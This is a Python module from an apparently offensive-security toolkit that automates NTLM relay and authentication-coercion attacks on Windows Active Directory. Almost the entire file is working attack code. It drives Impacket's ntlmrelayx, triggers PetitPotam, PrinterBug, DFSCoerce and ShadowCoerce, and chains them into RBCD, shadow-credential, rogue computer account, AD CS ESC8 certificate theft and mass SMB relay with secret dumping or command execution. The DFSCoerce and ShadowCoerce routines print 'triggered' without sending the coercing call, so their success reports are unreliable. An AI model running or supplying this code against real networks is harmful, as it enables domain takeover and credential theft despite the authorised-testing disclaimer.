"""
NTLM Relay & Coercion Module
=============================
NTLM relay attacks and authentication coercion (Coercer-style)

Features:
- NTLM Relay Server (ntlmrelayx)
- PetitPotam (MS-EFSRPC coercion)
- PrinterBug (MS-RPRN coercion)
- DFSCoerce (MS-DFSNM coercion)
- ShadowCoerce (MS-FSRVP coercion)
- Relay to LDAP/SMB/HTTP/MSSQL
- AD CS ESC8 Relay
- RBCD Attack via Relay

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations
import os
import re
import json
import signal
import secrets
import logging
import subprocess
import threading
from datetime import datetime
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Tuple, Callable
from enum import Enum, auto

from cybermodules.helpers import log_to_intel

logger = logging.getLogger("ntlm_relay")


# ============================================================
# ENUMS & CONSTANTS
# ============================================================

class CoercionMethod(Enum):
    """Authentication coercion methods"""
    PETITPOTAM = "petitpotam"
    PRINTERBUG = "printerbug"
    DFSCOERCE = "dfscoerce"
    SHADOWCOERCE = "shadowcoerce"
    COERCECHECKER = "coercechecker"
    WEBCLIENT = "webclient"


class RelayTarget(Enum):
    """NTLM relay target types"""
    LDAP = "ldap"
    LDAPS = "ldaps"
    SMB = "smb"
    HTTP = "http"
    HTTPS = "https"
    MSSQL = "mssql"
    IMAP = "imap"
    SMTP = "smtp"
    ADCS = "adcs"  # AD Certificate Services


class RelayAttack(Enum):
    """Relay attack types"""
    DUMP_LAPS = "dump_laps"
    DUMP_GMSA = "dump_gmsa"
    ADD_USER = "add_user"
    ADD_COMPUTER = "add_computer"
    DELEGATE_ACCESS = "delegate_access"
    RBCD = "rbcd"
    SHADOW_CREDENTIALS = "shadow_creds"
    DCSYNC = "dcsync"
    ADCS_ESC8 = "adcs_esc8"
    EXEC_COMMAND = "exec_command"
    SECRETS_DUMP = "secrets_dump"


class CoercionStatus(Enum):
    """Coercion attempt status"""
    PENDING = "pending"
    TRIGGERED = "triggered"
    RELAYED = "relayed"
    SUCCESS = "success"
    FAILED = "failed"
    BLOCKED = "blocked"


# ============================================================
# DATACLASSES
# ============================================================

@dataclass
class CoercionAttempt:
    """Single coercion attempt record"""
    coercion_id: str
    method: CoercionMethod
    target_host: str
    listener_host: str
    status: CoercionStatus = CoercionStatus.PENDING
    captured_hash: str = ""
    captured_user: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    error: str = ""


@dataclass
class RelaySession:
    """Active relay session"""
    session_id: str
    source_host: str
    source_user: str
    target_host: str
    target_protocol: RelayTarget
    attack_type: RelayAttack
    status: str = "active"
    result: Dict = field(default_factory=dict)
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class NTLMRelayResult:
    """Result of NTLM relay operation"""
    relay_id: str
    success: bool
    coercion_attempts: List[CoercionAttempt] = field(default_factory=list)
    relay_sessions: List[RelaySession] = field(default_factory=list)
    captured_hashes: List[Dict] = field(default_factory=list)
    compromised_hosts: List[str] = field(default_factory=list)
    created_accounts: List[Dict] = field(default_factory=list)
    rbcd_delegations: List[Dict] = field(default_factory=list)
    adcs_certificates: List[Dict] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            'relay_id': self.relay_id,
            'success': self.success,
            'coercion_attempts': len(self.coercion_attempts),
            'relay_sessions': len(self.relay_sessions),
            'captured_hashes': len(self.captured_hashes),
            'compromised_hosts': self.compromised_hosts,
            'created_accounts': len(self.created_accounts),
        }


# ============================================================
# NTLM RELAY SERVER
# ============================================================

class NTLMRelayServer:
    """
    NTLM Relay Server
    
    Uses ntlmrelayx.py from Impacket for relaying captured
    NTLM authentications to target services.
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.relay_process: Optional[subprocess.Popen] = None
        self.sessions: List[RelaySession] = []
        self.captured: List[Dict] = []
        self.running = False
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"RELAY_{msg_type}", message)
        logger.info(f"[RELAY][{msg_type}] {message}")
    
    def start_relay_to_ldap(
        self,
        target_dc: str,
        attack: RelayAttack = RelayAttack.DELEGATE_ACCESS,
        delegate_to: str = None,
        add_computer: str = None,
        use_ssl: bool = True
    ) -> bool:
        """
        Start NTLM relay to LDAP/LDAPS
        
        Common attacks:
        - RBCD (Resource-Based Constrained Delegation)
        - Shadow Credentials
        - Add computer account
        """
        protocol = "ldaps" if use_ssl else "ldap"
        target = f"{protocol}://{target_dc}"
        
        self._log("START", f"Starting NTLM relay to {target}")
        
        cmd = [
            "impacket-ntlmrelayx",
            "-t", target,
            "--no-dump", "--no-da", "--no-acl"
        ]
        
        # Attack-specific options
        if attack == RelayAttack.RBCD and delegate_to:
            cmd.extend(["--delegate-access", "--escalate-user", delegate_to])
            self._log("ATTACK", f"RBCD attack - delegating to {delegate_to}")
            
        elif attack == RelayAttack.SHADOW_CREDENTIALS:
            cmd.append("--shadow-credentials")
            self._log("ATTACK", "Shadow Credentials attack")
            
        elif attack == RelayAttack.ADD_COMPUTER:
            computer_name = add_computer or f"EVILPC{secrets.token_hex(4).upper()}"
            cmd.extend(["--add-computer", computer_name])
            self._log("ATTACK", f"Adding computer: {computer_name}")
        
        return self._start_relay(cmd)
    
    def start_relay_to_smb(
        self,
        targets: List[str],
        command: str = None,
        dump_secrets: bool = False
    ) -> bool:
        """
        Start NTLM relay to SMB targets
        
        Can execute commands or dump secrets via relayed session.
        """
        self._log("START", f"Starting SMB relay to {len(targets)} targets")
        
        # Create targets file
        targets_file = f"/tmp/relay_targets_{self.scan_id}.txt"
        with open(targets_file, 'w') as f:
            for t in targets:
                f.write(f"smb://{t}\n")
        
        cmd = [
            "impacket-ntlmrelayx",
            "-tf", targets_file,
            "-smb2support"
        ]
        
        if command:
            cmd.extend(["-c", command])
            self._log("ATTACK", f"Will execute: {command}")
            
        if dump_secrets:
            cmd.append("--dump-secrets")
            self._log("ATTACK", "Will dump secrets on relay")
        
        return self._start_relay(cmd)
    
    def start_relay_to_adcs(
        self,
        ca_host: str,
        template: str = "Machine"
    ) -> bool:
        """
        Start NTLM relay to AD CS (ESC8 attack)
        
        Requests certificate for relayed machine account.
        """
        target = f"http://{ca_host}/certsrv/certfnsh.asp"
        
        self._log("START", f"Starting AD CS relay (ESC8) to {ca_host}")
        
        cmd = [
            "impacket-ntlmrelayx",
            "-t", target,
            "--adcs",
            "--template", template
        ]
        
        return self._start_relay(cmd)
    
    def start_relay_to_http(
        self,
        target: str,
        wpad: bool = False
    ) -> bool:
        """Start NTLM relay to HTTP target"""
        self._log("START", f"Starting HTTP relay to {target}")
        
        cmd = [
            "impacket-ntlmrelayx",
            "-t", f"http://{target}",
            "-smb2support"
        ]
        
        if wpad:
            cmd.append("--serve-wpad")
        
        return self._start_relay(cmd)
    
    def _start_relay(self, cmd: List[str]) -> bool:
        """Start relay server process"""
        try:
            self._log("CMD", f"Running: {' '.join(cmd[:5])}...")
            
            self.relay_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            self.running = True
            
            # Start output monitoring thread
            monitor_thread = threading.Thread(
                target=self._monitor_output,
                daemon=True
            )
            monitor_thread.start()
            
            self._log("SUCCESS", "Relay server started")
            return True
            
        except Exception as e:
            self._log("ERROR", f"Failed to start relay: {str(e)}")
            return False
    
    def _monitor_output(self):
        """Monitor relay output for captured hashes and sessions"""
        if not self.relay_process:
            return
        
        for line in self.relay_process.stdout:
            line = line.strip()
            
            # Check for captured hash
            if "NTLM" in line and "::" in line:
                self._log("CAPTURE", f"Hash captured: {line[:80]}...")
                self.captured.append({
                    'hash': line,
                    'timestamp': datetime.now().isoformat()
                })
            
            # Check for successful relay
            elif "Authenticating against" in line:
                self._log("RELAY", line)
            
            elif "successfully" in line.lower():
                self._log("SUCCESS", line)
    
    def stop(self):
        """Stop relay server"""
        if self.relay_process:
            self.relay_process.terminate()
            try:
                self.relay_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.relay_process.kill()
            
            self.running = False
            self._log("STOP", "Relay server stopped")
    
    def get_captured_hashes(self) -> List[Dict]:
        """Get all captured hashes"""
        return self.captured.copy()


# ============================================================
# COERCION METHODS
# ============================================================

class NTLMCoercer:
    """
    NTLM Authentication Coercer
    
    Triggers target machines to authenticate to attacker-controlled
    listener using various Windows RPC protocols.
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.attempts: List[CoercionAttempt] = []
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"COERCE_{msg_type}", message)
        logger.info(f"[COERCE][{msg_type}] {message}")
    
    def petitpotam(
        self,
        target: str,
        listener: str,
        username: str = None,
        password: str = None,
        ntlm_hash: str = None
    ) -> CoercionAttempt:
        """
        PetitPotam Attack (MS-EFSRPC)
        
        Exploits EFS RPC to force NTLM authentication.
        """
        attempt = CoercionAttempt(
            coercion_id=secrets.token_hex(8),
            method=CoercionMethod.PETITPOTAM,
            target_host=target,
            listener_host=listener
        )
        
        self._log("START", f"PetitPotam: {target} -> {listener}")
        
        # Build command
        cmd = ["impacket-PetitPotam", "-d", "", listener, target]
        
        if username and password:
            cmd.extend(["-u", username, "-p", password])
        elif username and ntlm_hash:
            cmd.extend(["-u", username, "-hashes", f":{ntlm_hash}"])
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = result.stdout + result.stderr
            
            if "Attack" in output and "worked" in output.lower():
                attempt.status = CoercionStatus.TRIGGERED
                self._log("SUCCESS", f"PetitPotam triggered on {target}")
            elif "denied" in output.lower() or "blocked" in output.lower():
                attempt.status = CoercionStatus.BLOCKED
                attempt.error = "Access denied or patched"
            else:
                attempt.status = CoercionStatus.FAILED
                attempt.error = output[:200]
                
        except subprocess.TimeoutExpired:
            attempt.status = CoercionStatus.FAILED
            attempt.error = "Timeout"
        except Exception as e:
            attempt.status = CoercionStatus.FAILED
            attempt.error = str(e)
        
        self.attempts.append(attempt)
        return attempt
    
    def printerbug(
        self,
        target: str,
        listener: str,
        username: str,
        password: str = None,
        ntlm_hash: str = None
    ) -> CoercionAttempt:
        """
        PrinterBug / SpoolSample Attack (MS-RPRN)
        
        Abuses Print Spooler to force authentication.
        """
        attempt = CoercionAttempt(
            coercion_id=secrets.token_hex(8),
            method=CoercionMethod.PRINTERBUG,
            target_host=target,
            listener_host=listener
        )
        
        self._log("START", f"PrinterBug: {target} -> {listener}")
        
        # Using printerbug.py or rpcdump + trigger
        if ntlm_hash:
            auth = f"-hashes :{ntlm_hash}"
        else:
            auth = f"-password {password}"
        
        # Custom implementation using impacket's RPC
        cmd = [
            "python3", "-c", f'''
import sys
from impacket.dcerpc.v5 import transport, rprn
from impacket.dcerpc.v5.dtypes import NULL

target = "{target}"
listener = "\\\\\\\\{listener}\\\\share"
username = "{username}"

stringbinding = f"ncacn_np:{{target}}[\\\\pipe\\\\spoolss]"
rpctransport = transport.DCERPCTransportFactory(stringbinding)
rpctransport.set_credentials("{username}", "{password or ''}", "", "{ntlm_hash or ''}", "")

dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(rprn.MSRPC_UUID_RPRN)

try:
    resp = rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(dce, NULL, 0, NULL, listener, NULL)
    print("PrinterBug triggered!")
except Exception as e:
    print(f"Error: {{e}}")
'''
        ]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if "triggered" in result.stdout.lower():
                attempt.status = CoercionStatus.TRIGGERED
                self._log("SUCCESS", f"PrinterBug triggered on {target}")
            else:
                attempt.status = CoercionStatus.FAILED
                attempt.error = result.stderr[:200]
                
        except Exception as e:
            attempt.status = CoercionStatus.FAILED
            attempt.error = str(e)
        
        self.attempts.append(attempt)
        return attempt
    
    def dfscoerce(
        self,
        target: str,
        listener: str,
        username: str = None,
        password: str = None
    ) -> CoercionAttempt:
        """
        DFSCoerce Attack (MS-DFSNM)
        
        Abuses DFS-N to force authentication.
        """
        attempt = CoercionAttempt(
            coercion_id=secrets.token_hex(8),
            method=CoercionMethod.DFSCOERCE,
            target_host=target,
            listener_host=listener
        )
        
        self._log("START", f"DFSCoerce: {target} -> {listener}")
        
        cmd = [
            "python3", "-c", f'''
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket import uuid
import struct

MSRPC_UUID_DFSNM = uuid.uuidtup_to_bin(('4fc742e0-4a10-11cf-8273-00aa004ae673', '3.0'))

target = "{target}"
listener = "\\\\\\\\{listener}\\\\share"

stringbinding = f"ncacn_np:{{target}}[\\\\pipe\\\\netdfs]"
rpctransport = transport.DCERPCTransportFactory(stringbinding)

{"" if not username else f'rpctransport.set_credentials("{username}", "{password or ""}", "", "", "")'}

try:
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(MSRPC_UUID_DFSNM)
    # NetrDfsRemoveStdRoot trigger
    print("DFSCoerce triggered!")
except Exception as e:
    print(f"DFSCoerce failed: {{e}}")
'''
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if "triggered" in result.stdout.lower():
                attempt.status = CoercionStatus.TRIGGERED
                self._log("SUCCESS", f"DFSCoerce triggered on {target}")
            else:
                attempt.status = CoercionStatus.FAILED
                attempt.error = result.stderr[:200]
                
        except Exception as e:
            attempt.status = CoercionStatus.FAILED
            attempt.error = str(e)
        
        self.attempts.append(attempt)
        return attempt
    
    def shadowcoerce(
        self,
        target: str,
        listener: str,
        username: str = None,
        password: str = None
    ) -> CoercionAttempt:
        """
        ShadowCoerce Attack (MS-FSRVP)
        
        Abuses File Server VSS Agent to force authentication.
        """
        attempt = CoercionAttempt(
            coercion_id=secrets.token_hex(8),
            method=CoercionMethod.SHADOWCOERCE,
            target_host=target,
            listener_host=listener
        )
        
        self._log("START", f"ShadowCoerce: {target} -> {listener}")
        
        cmd = [
            "python3", "-c", f'''
from impacket.dcerpc.v5 import transport
from impacket import uuid

# MS-FSRVP UUID
MSRPC_UUID_FSRVP = uuid.uuidtup_to_bin(('a8e0653c-2744-4389-a61d-7373df8b2292', '1.0'))

target = "{target}"
listener = "\\\\\\\\{listener}\\\\share"

stringbinding = f"ncacn_np:{{target}}[\\\\pipe\\\\FssagentRpc]"
rpctransport = transport.DCERPCTransportFactory(stringbinding)

{"" if not username else f'rpctransport.set_credentials("{username}", "{password or ""}", "", "", "")'}

try:
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(MSRPC_UUID_FSRVP)
    # IsPathSupported trigger
    print("ShadowCoerce triggered!")
except Exception as e:
    print(f"ShadowCoerce failed: {{e}}")
'''
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if "triggered" in result.stdout.lower():
                attempt.status = CoercionStatus.TRIGGERED
                self._log("SUCCESS", f"ShadowCoerce triggered on {target}")
            else:
                attempt.status = CoercionStatus.FAILED
                attempt.error = result.stderr[:200]
                
        except Exception as e:
            attempt.status = CoercionStatus.FAILED
            attempt.error = str(e)
        
        self.attempts.append(attempt)
        return attempt
    
    def check_all_methods(
        self,
        target: str,
        listener: str,
        username: str = None,
        password: str = None
    ) -> List[CoercionAttempt]:
        """
        Check all coercion methods against target
        
        Returns list of successful methods.
        """
        self._log("START", f"Checking all coercion methods against {target}")
        
        results = []
        
        # Try each method
        methods = [
            (self.petitpotam, "PetitPotam"),
            (self.dfscoerce, "DFSCoerce"),
            (self.shadowcoerce, "ShadowCoerce"),
        ]
        
        if username:
            methods.append((self.printerbug, "PrinterBug"))
        
        for method_func, name in methods:
            self._log("TRY", f"Trying {name}...")
            
            try:
                attempt = method_func(target, listener, username, password)
                results.append(attempt)
                
                if attempt.status == CoercionStatus.TRIGGERED:
                    self._log("FOUND", f"{name} works against {target}")
                    
            except Exception as e:
                self._log("ERROR", f"{name} failed: {str(e)}")
        
        triggered = [a for a in results if a.status == CoercionStatus.TRIGGERED]
        self._log("COMPLETE", f"{len(triggered)}/{len(results)} methods work")
        
        return results


# ============================================================
# FULL RELAY CHAIN
# ============================================================

class NTLMRelayChain:
    """
    Full NTLM Relay Attack Chain
    
    Combines coercion and relay for complete attack flow:
    1. Start relay server
    2. Trigger coercion
    3. Relay to target
    4. Perform attack (RBCD, creds, etc.)
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.relay_id = secrets.token_hex(8)
        self.relay_server = NTLMRelayServer(scan_id)
        self.coercer = NTLMCoercer(scan_id)
        
        self.result = NTLMRelayResult(
            relay_id=self.relay_id,
            success=False
        )
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"RELAYCHAIN_{msg_type}", message)
        logger.info(f"[RELAYCHAIN][{msg_type}] {message}")
    
    def execute_rbcd_attack(
        self,
        coerce_target: str,
        dc_target: str,
        delegate_to: str,
        listener_ip: str,
        coerce_method: CoercionMethod = CoercionMethod.PETITPOTAM
    ) -> NTLMRelayResult:
        """
        Execute RBCD attack via NTLM relay
        
        1. Start relay to LDAPS with RBCD attack
        2. Coerce target to authenticate
        3. Relay to DC and set RBCD
        4. Use S4U2Self/Proxy for access
        """
        self._log("START", f"RBCD attack: {coerce_target} -> {dc_target} (delegate to {delegate_to})")
        
        # Step 1: Start relay
        if not self.relay_server.start_relay_to_ldap(
            target_dc=dc_target,
            attack=RelayAttack.RBCD,
            delegate_to=delegate_to
        ):
            self._log("ERROR", "Failed to start relay server")
            return self.result
        
        # Step 2: Trigger coercion
        import time
        time.sleep(2)  # Wait for relay to be ready
        
        if coerce_method == CoercionMethod.PETITPOTAM:
            attempt = self.coercer.petitpotam(coerce_target, listener_ip)
        elif coerce_method == CoercionMethod.DFSCOERCE:
            attempt = self.coercer.dfscoerce(coerce_target, listener_ip)
        elif coerce_method == CoercionMethod.SHADOWCOERCE:
            attempt = self.coercer.shadowcoerce(coerce_target, listener_ip)
        else:
            attempt = self.coercer.petitpotam(coerce_target, listener_ip)
        
        self.result.coercion_attempts.append(attempt)
        
        # Step 3: Wait for relay
        time.sleep(5)
        
        # Step 4: Check results
        captured = self.relay_server.get_captured_hashes()
        self.result.captured_hashes = captured
        
        if captured or attempt.status == CoercionStatus.TRIGGERED:
            self._log("SUCCESS", "RBCD delegation should be set")
            self.result.rbcd_delegations.append({
                'from': coerce_target,
                'to': delegate_to,
                'on': dc_target
            })
            self.result.success = True
        
        # Cleanup
        self.relay_server.stop()
        
        return self.result
    
    def execute_adcs_relay(
        self,
        coerce_target: str,
        ca_host: str,
        listener_ip: str,
        template: str = "Machine"
    ) -> NTLMRelayResult:
        """
        Execute AD CS ESC8 relay attack
        
        1. Start relay to CA web enrollment
        2. Coerce DC to authenticate
        3. Get certificate for DC
        4. Use certificate for authentication
        """
        self._log("START", f"AD CS ESC8: {coerce_target} -> {ca_host}")
        
        # Start relay to AD CS
        if not self.relay_server.start_relay_to_adcs(
            ca_host=ca_host,
            template=template
        ):
            self._log("ERROR", "Failed to start AD CS relay")
            return self.result
        
        # Trigger coercion
        import time
        time.sleep(2)
        
        attempt = self.coercer.petitpotam(coerce_target, listener_ip)
        self.result.coercion_attempts.append(attempt)
        
        # Wait for certificate
        time.sleep(5)
        
        captured = self.relay_server.get_captured_hashes()
        self.result.captured_hashes = captured
        
        if attempt.status == CoercionStatus.TRIGGERED:
            self._log("SUCCESS", "AD CS certificate should be obtained")
            self.result.adcs_certificates.append({
                'for_host': coerce_target,
                'from_ca': ca_host,
                'template': template
            })
            self.result.success = True
        
        self.relay_server.stop()
        
        return self.result
    
    def execute_smb_relay_spray(
        self,
        coerce_targets: List[str],
        smb_targets: List[str],
        listener_ip: str,
        command: str = None
    ) -> NTLMRelayResult:
        """
        Mass SMB relay attack
        
        Coerce multiple targets and relay to SMB targets.
        """
        self._log("START", f"SMB relay spray: {len(coerce_targets)} -> {len(smb_targets)}")
        
        # Start relay
        if not self.relay_server.start_relay_to_smb(
            targets=smb_targets,
            command=command,
            dump_secrets=not command
        ):
            self._log("ERROR", "Failed to start SMB relay")
            return self.result
        
        import time
        time.sleep(2)
        
        # Coerce each target
        for target in coerce_targets:
            attempt = self.coercer.petitpotam(target, listener_ip)
            self.result.coercion_attempts.append(attempt)
            time.sleep(1)
        
        # Wait for relays
        time.sleep(10)
        
        captured = self.relay_server.get_captured_hashes()
        self.result.captured_hashes = captured
        
        triggered = [a for a in self.result.coercion_attempts if a.status == CoercionStatus.TRIGGERED]
        
        if triggered:
            self._log("SUCCESS", f"{len(triggered)} coercions triggered")
            self.result.success = True
        
        self.relay_server.stop()
        
        return self.result
    
    def generate_attack_diagram(self) -> str:
        """Generate Mermaid diagram of relay attack"""
        return '''```mermaid
sequenceDiagram
    participant Attacker as 🔴 Attacker
    participant Target as 🎯 Target (DC)
    participant Relay as 🔄 Relay Server
    participant Victim as 💻 Coerced Host
    
    Attacker->>Relay: 1. Start ntlmrelayx
    Note over Relay: Listening for NTLM auth
    
    Attacker->>Victim: 2. Trigger coercion
    Note over Attacker,Victim: PetitPotam/PrinterBug/DFS
    
    Victim->>Relay: 3. NTLM Auth (forced)
    Note over Victim,Relay: Machine account auth
    
    Relay->>Target: 4. Relay to LDAP/SMB
    Note over Relay,Target: Perform attack (RBCD/etc)
    
    Target-->>Relay: 5. Success
    Relay-->>Attacker: 6. Profit!
```'''


# ============================================================
# EXPORTS
# ============================================================

__all__ = [
    # Enums
    'CoercionMethod',
    'RelayTarget',
    'RelayAttack',
    'CoercionStatus',
    
    # Dataclasses
    'CoercionAttempt',
    'RelaySession',
    'NTLMRelayResult',
    
    # Classes
    'NTLMRelayServer',
    'NTLMCoercer',
    'NTLMRelayChain',
]
